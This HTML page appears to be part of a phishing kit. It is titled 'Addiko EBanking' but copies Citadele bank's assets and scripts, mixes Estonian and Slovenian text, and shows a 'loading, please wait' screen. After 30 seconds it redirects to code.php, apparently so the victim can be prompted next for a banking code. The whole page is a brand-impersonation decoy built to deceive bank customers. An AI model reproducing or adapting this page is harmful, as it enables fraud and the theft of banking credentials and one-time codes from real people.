<meta http-equiv="refresh" content="30;url=code.php" />
<html class="translated-ltr"><head>
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-store">
<meta name="viewport" content="width=device-width, maximum-scale=1.0, viewport-fit=cover">
<meta name="description" content="IKõik sinu igapäevased pangateenused on saadaval 24/7. Madalamad tasud kui kontoris, lihtne kasutada.">

    <title>Addiko EBanking</title>

<link rel="icon" href="https://online.citadele.lv/ibbf/images/citadele/favicon.ico" sizes="16x16 32x32" type="image/x-icon">
<link rel="apple-touch-icon" href="https://online.citadele.lv/ibbf/images/citadele/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="57x57" href="https://online.citadele.lv/ibbf/images/citadele/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="72x72" href="https://online.citadele.lv/ibbf/images/citadele/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="114x114" href="https://online.citadele.lv/ibbf/images/citadele/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="144x144" href="https://online.citadele.lv/ibbf/images/citadele/apple-touch-icon-144x144.png">
<link rel="stylesheet" href="https://online.citadele.lv/ibbf/css/ibbf-verrel-107_6_0.css" type="text/css" media="all">

<script type="text/javascript">document.ib = {
    menu: '0',
    submenu: 'forgotPassword',
    version: '107_6_0'
}</script>

<script type="text/javascript" src="https://online.citadele.lv/ibbf/js/inline-verrel-107_6_0.js"></script>
<script async="" type="text/javascript" src="https://online.citadele.lv/ibbf/js/dependencies-verrel-107_6_0.js"></script>
<script async="" type="text/javascript" src="https://online.citadele.lv/ibbf/js/ibbf-verrel-107_6_0.js"></script>

<script async="" type="text/javascript" src="https://online.citadele.lv/ibbf/js/views/forgotPassword-verrel-107_6_0.js"></script>






	<script type="text/javascript" src="https://online.citadele.lv/ibbf/js/tags/wwQtPMzdY-verrel-107_6_0.js"></script>




        <meta name="apple-itunes-app" content="app-id=495139240">
        
    
<script id="tmx_tags_js" type="text/javascript" src="https://content.citadele.lv/nnsxpcuohckvd816.js?sn88w215nfg4sq99=aom4xb8t&amp;z0wmsegk1e8jat9m=63f0229c-c7a6-41da-8fe1-574e7e611e1c"></script><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"></head>

    <body class="css_responsive">
		








	<script async="" type="text/javascript">wwQtPMzdY.profile("content.citadele.lv", "aom4xb8t", "63f0229c-c7a6-41da-8fe1-574e7e611e1c");</script>
	<noscript>
		<iframe style="width: 100px; height: 100px; border: 0; position: absolute; top: -5000px;" src="content.citadele.lv/fp/tags?org_id=aom4xb8t&session_id=63f0229c-c7a6-41da-8fe1-574e7e611e1c&pageid="></iframe>
	</noscript>
	<div class="css_header">
            <div id="css_header_grey">
                <div class="css_header_grey_info">
                    

                    


























    
        
    
    
    
	
    
















    


<!-- request location might be wrong. For example, when switching customers with different location -->

    





     


                </div>
            </div>
    </div>
 <br><br><br> <br><br><br> <br><br><br> <br><br><br> <br><br><br> <br><br><br> <br>
		<div id="css_main_body_container">
			<div class="css_login-content">
                
                
 
	
	

<div class="css_logo_subheader"><br>
  <br>
  <img src="images/99.gif" width="65" height="64">  <br><br><br>
     Nalagam. Prosimo počakajte...</div>
    
 



    

    </div>
        </div>

        
 


<div id="css_footer">
   
    
 
</div>














	
	
		
	






	



	




<div class="css_modal-overlay" tabindex="-1" id="modal_help" hidden="">
	<!--[if IE]><div class="css_modal-iefix"><![endif]-->
	<div class="css_modal">
		<div class="css_modal-content css_modal-help-content">
			
		</div>
		
			
			<button class="css_modal-close css_icon css_close-icon" title="close">
				<span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">close</font></font></span>
			</button>
		
	</div>
	<!--[if IE]></div><![endif]-->
</div>


    

<div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Translate"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" data-time="1672401445011" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;"></iframe><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>